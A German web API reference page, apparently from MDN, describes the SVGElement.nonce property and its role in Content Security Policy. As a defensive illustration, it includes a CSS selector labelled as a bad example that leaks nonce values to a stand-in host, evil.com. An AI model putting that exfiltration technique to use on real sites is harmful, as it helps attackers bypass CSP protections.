---
title: "SVGElement: nonce Eigenschaft"
short-title: nonce
slug: Web/API/SVGElement/nonce
l10n:
  sourceCommit: 97dc5e941cca2f67ece5ff91d0c96674f210fef9
---

{{APIRef("SVG")}}

Die **`nonce`**-Eigenschaft des [`SVGElement`](/de/docs/Web/API/SVGElement)-Interfaces gibt die Nonce zurück, die von der [Content Security Policy](/de/docs/Web/HTTP/CSP) verwendet wird, um zu bestimmen, ob ein bestimmter Abruf erlaubt wird.

## Wert

Ein String; die kryptografische Nonce oder ein leerer String, wenn keine Nonce gesetzt ist.

## Beispiele

### Abrufen eines Nonce-Werts

In der Vergangenheit unterstützten nicht alle Browser das `nonce` IDL-Attribut, daher war ein Workaround notwendig, indem [`getAttribute`](/de/docs/Web/API/Element/getAttribute) als Fallback verwendet wurde:

```js
const svg = document.querySelector("svg");
const nonce = svg.nonce || svg.getAttribute("nonce");

// Modern browsers hide the nonce attribute from getAttribute()
console.log(nonce); // Prefer using `svg.nonce`
```

Neuere Browserversionen verbergen `nonce`-Werte, die auf diese Weise zugegriffen werden (ein leerer String wird zurückgegeben). Die IDL-Eigenschaft (`svg['nonce']`) wird der einzige Weg sein, um auf Nonces zuzugreifen.

Das Verbergen von Nonces hilft zu verhindern, dass Angreifer Nonce-Daten über Mechanismen abgreifen, die Daten aus Inhaltsattributen erfassen können, wie z.B. diesem CSS-Selektor:

```css example-bad
svg[nonce~="whatever"] {
  background: url("https://evil.com/nonce?whatever");
}
```

## Spezifikationen

{{Specifications}}

## Browser-Kompatibilität

{{Compat}}

## Siehe auch

- [`HTMLElement.nonce`](/de/docs/Web/API/HTMLElement/nonce) eine ähnliche Methode für HTML-Elemente.
- [`nonce` globales Attribut](/de/docs/Web/HTML/Global_attributes/nonce)
- [Content Security Policy](/de/docs/Web/HTTP/CSP)
- CSP: {{CSP("script-src")}}
